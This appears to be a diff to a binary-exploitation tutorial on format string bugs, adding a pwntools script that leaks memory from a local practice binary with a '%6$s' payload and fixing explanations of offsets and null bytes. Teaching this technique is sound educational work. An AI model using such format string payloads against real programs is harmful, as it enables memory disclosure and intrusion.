@@ -93,7 +93,7 @@ $ ./test
 f7f74080 0 5657b1c0 782573fc 20782520
 ```
 
-It reads values off the stack and returns them!
+It reads values off the stack and returns them as the developer wasn't expecting so many format string specifiers. 
 
 ### Choosing Offsets
 
@@ -160,11 +160,23 @@ $ python3 exploit.py
 [*] b'DCBA|0x41424344'
 ```
 
-Nice it works. The base address of the binary is `0x8048000`, so let's replace the `0x41424344` with that and read it.
+Nice it works. The base address of the binary is `0x8048000`, so let's replace the `0x41424344` with that and read it with `%s`:
+
+```python
+from pwn import *
+
+p = process('./vuln')
+
+payload = p32(0x8048000)
+payload += b'|%6$s'
+
+p.sendline(payload)
+log.info(p.clean())
+```
 
 It doesn't work.
 
-The reason it doesn't work is that `printf` stops at null bytes, and the very first character is a null byte. We can to put the format specifier first.
+The reason it doesn't work is that `printf` stops at null bytes, and the very first character is a null byte. We have to put the format specifier first.
 
 ```python
 from pwn import *
@@ -180,7 +192,7 @@ log.info(p.clean())
 
 Let's break down the payload:
 
-* We add 4 \| because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address
+* We add 4 `|` because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address
 * The offset is `%8$p` because the start of the buffer is generally at `%6$p`. However, memory addresses are 4 bytes long each and we already have 8 bytes, so it's two memory addresses further along at `%8$p`. 
 
 ```text
